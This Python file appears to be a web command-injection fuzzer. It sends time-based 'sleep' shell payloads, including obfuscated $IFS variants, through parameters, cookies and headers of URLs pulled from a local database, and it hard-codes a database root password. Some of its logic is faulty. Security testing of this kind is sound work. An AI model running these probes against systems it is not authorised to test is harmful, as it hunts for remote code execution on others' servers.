import requests
import mysql.connector
import time
from urllib.parse import parse_qs
import json
from colorama import init, Fore, Style


class CommandInjection:
    def __init__(self):
        self.time_payloads_five = [
            ";zzingzzing=\";sleep 5\";eval $zzingzzing",
            "';zzingzzing=\";sleep 5\";eval $zzingzzing'"
                              ]
        self.time_payloads_ten = [
            ";zzingzzing=\";sleep 10\";eval $zzingzzing",
            "';zzingzzing=\";sleep 10\";eval $zzingzzing'"
        ]

#  tar -cf aaa.tar ./uploads/
#  ";sleep 10;
        # ;sleep 10
        # $(sleep 10)
        # `sleep 10`
        # ';sleep 10
        # "sleep 10
        # "|| sleep 10
# cmd = ["sleep 10","SleeP 10","SleEp$IFS10","`sleep 10`","$(sleep 10)"]
# arr1 ['"',"'",""]
# arr2 [";","&&","&","|",""]
# arr3

        self.command_injection = open('./payloads/Command Injection/command_payload.txt', 'r')

        self.connection = None
        self.cursor = None

    def file_close(self):
        self.command_injection.close()

    def get_url(self):
        url_list = []

        try:
            self.connection = mysql.connector.connect(
                host="127.0.0.1",
                database="Fuzzingzzingii",
                user="root",
                password="skawjddns123@"
            )
            if self.connection.is_connected():
                self.cursor = self.connection.cursor()

                self.cursor.execute(f'SELECT url FROM collected_urls;')
                result = self.cursor.fetchall()

                for url in result:
                    url_list.append(url[0])

        except Exception as e:
            print(f"SQL connect error : {e} ")

        return url_list

    def get_params(self, url):
        result = []
        if self.connection.is_connected():
            self.cursor.execute('SELECT method, parameters FROM requests WHERE url=%s', (url,))
            result = self.cursor.fetchall()

        return result

    def generate_payloads(self, sec):
        cmd = [f"sleep {sec}", f"SleeP {sec}", f"SleEp$IFS{sec}", f"'sleep {sec}'", f"$(sleep {sec})"]
        sp1 = ['"', "'", ";", "&&", "&", "|", "%"]

        for i in cmd:
            if sec == 5:
                self.time_payloads_five.append(i)
                for j in sp1:
                    if j == "'" and j == '"' and j == "" and j == "%" and j == "$":
                        pass
                    else:
                        payload = i + j
                        self.time_payloads_five.append(payload)
                    payload = j + i + j
                    self.time_payloads_five.append(payload)

            elif sec == 10:
                self.time_payloads_ten.append(i)
                for j in sp1:
                    if j == "'" and j == '"' and j == "" and j == "%" and j == "$":
                        pass
                    else:
                        payload = i + j
                        self.time_payloads_ten.append(payload)
                    payload = j + i + j
                    self.time_payloads_ten.append(payload)

    def check_time_five(self, url, method, param):
        if param:
            param = parse_qs(param)

            for payload in self.time_payloads_five:
                for key in param:
                    param[key] = payload
                    print(f'CHECKING...\turl : {url}\t\tmethod : {method}\t\tpayload : {param}')
                    # 이 부분을 수정 해야 함
                    if method == 'GET':
                        start_time = time.time()
                        resp_param = requests.get(url, params=param)
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            print(f"Checked Basic payload = {payload}")
                            return url, method, param

                        start_time = time.time()
                        resp_cookie = requests.get(url, cookies={'Cookie': payload})
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            print(f"Checked Basic payload = {payload}")
                            return url, method, param

                        start_time = time.time()
                        resp_header = requests.get(url, headers={'User-Agent': payload,
                                                                 'Referer': payload,
                                                                 'X-Forwarded-For': payload})
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            print(f"Checked Basic payload = {payload}")
                            return url, method, param

                    elif method == 'POST':
                        start_time = time.time()
                        resp_param = requests.post(url, data=param)
                        end_time = time.time() - start_time
                        if int(end_time) >= 5:
                            print(f"Checked Basic payload = {payload}")
                            return url, method, param

        return False

    def check_time_ten(self, url, method, param):
        if param:
            param = parse_qs(param)

            for payload in self.time_payloads_ten:
                for key in param:
                    param[key] = payload
                    print(f'CHECKING...\turl : {url}\t\tmethod : {method}\t\tpayload : {param}')

                    if method == 'GET':
                        start_time = time.time()
                        resp_param = requests.get(url, params=param)
                        end_time = time.time() - start_time
                        if int(end_time) >= 10:
                            print(f"Checked payload = {payload}")
                            return url, method, param

                        start_time = time.time()
                        resp_cookie = requests.get(url, cookies={'Cookie': payload})
                        end_time = time.time() - start_time
                        if int(end_time) >= 10:
                            print(f"Checked payload = {payload}")
                            return url, method, param

                        start_time = time.time()
                        resp_header = requests.get(url, headers={'User-Agent': payload,
                                                                 'Referer': payload,
                                                                 'X-Forwarded-For': payload})
                        end_time = time.time() - start_time
                        if int(end_time) >= 10:
                            print(f"Checked payload = {payload}")
                            return url, method, param

                    elif method == 'POST':
                        start_time = time.time()
                        resp_param = requests.post(url, data=param)
                        end_time = time.time() - start_time
                        if int(end_time) >= 10:
                            print(f"Checked payload = {payload}")
                            return url, method, param

        return False

    def get_payloads(self):
        payloads = self.command_injection.readlines()
        return payloads

    def execute_injection(self, url, method, param, payloads):
        init()
        for payload in payloads:
            payload = payload.strip()
            for key in param.keys():
                param[key] = payload

                if method == 'GET':
                    start_time = time.time()
                    resp_param = requests.get(url, params=param)
                    end_time = time.time() - start_time
                    if int(end_time) >= 5:
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection Vulnerability Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t RESULT : TRUE")

                    start_time = time.time()
                    resp_cookie = requests.get(url, cookies={'Cookie': payload})
                    end_time = time.time()
                    if end_time - start_time >= 5:
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection Vulnerability Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t RESULT : TRUE")

                    start_time = time.time()
                    resp_header = requests.get(url, headers={'User-Agent': payload,
                                                             'Referer': payload,
                                                             'X-Forwarded-For': payload})
                    end_time = time.time() - start_time
                    if int(end_time) >= 5:
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection Vulnerability Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t RESULT : TRUE")

                elif method == 'POST':
                    start_time = time.time()
                    resp_param = requests.post(url, data=param, allow_redirects=True)
                    end_time = time.time() - start_time
                    if int(end_time) >= 5:
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection Vulnerability Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t RESULT : TRUE")

                    else:
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection Vulnerability Not Found{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t RESULT : TRUE")
        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}!!!\tThere is no Command Injection Vulnerability\t!!!{Style.RESET_ALL}")

    def execute_commandi(self, url, method, param, payloads):
        self.generate_payloads(5)
        self.generate_payloads(10)

        # SIMPLE
        time_result_five = self.check_time_five(url, method, param)
        time_result_ten = self.check_time_ten(url, method, param)

        time_result = time_result_five if time_result_five and time_result_ten else False

        if time_result:
            checked_url, checked_method, checked_param = time_result
            print(f'EXECUTING COMMAND INJECTION FUZZING...\turl : {checked_url}\t\tmethod : {checked_method}\t\tparam : {checked_param}')
            self.execute_injection(checked_url, checked_method, checked_param, payloads)
